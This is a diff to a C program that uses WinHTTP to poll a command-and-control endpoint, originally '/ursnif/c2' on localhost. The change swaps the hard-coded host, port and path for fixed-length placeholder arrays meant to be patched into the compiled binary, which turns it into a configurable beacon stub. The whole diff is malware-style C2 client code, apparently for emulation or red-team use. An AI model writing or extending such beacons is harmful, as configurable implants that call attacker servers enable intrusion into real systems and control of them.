@@ -5,6 +5,18 @@
 #include <assert.h>
 #include <winhttp.h>
 
+char host[]  = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"; // len: 55
+char url[]   = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; // len: 55
+char port[]  = "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"; // len: 55
+
+
+wchar_t *convertCharArrayToLPCWSTR(const char* charArray)
+{
+    wchar_t* wString=malloc(4096);
+    MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
+    return wString;
+}
+
 
 int loop()
 {
@@ -19,8 +31,9 @@ int loop()
     }
     
     // Connect to server
-    HINTERNET hConnect = WinHttpConnect(hSession, L"127.0.0.1", 
-        5000, 0);
+    int *a = (int*) port;
+    LPCWSTR wHost = convertCharArrayToLPCWSTR(host);
+    HINTERNET hConnect = WinHttpConnect(hSession, wHost, *a, 0);
     if (hConnect == NULL) {
         printf("WinHttpConnect failed\n");
         WinHttpCloseHandle(hSession);
@@ -28,7 +41,8 @@ int loop()
     }
     
     // Open request
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/ursnif/c2", 
+    LPCWSTR wUrl = convertCharArrayToLPCWSTR(url);
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wUrl, 
         NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 
         WINHTTP_FLAG_REFRESH);
     if (hRequest == NULL) {
@@ -101,4 +115,5 @@ int loop()
     // Cleanup
     free(buffer);
     //WinHttpCloseHandle();
+    return 0;
 }
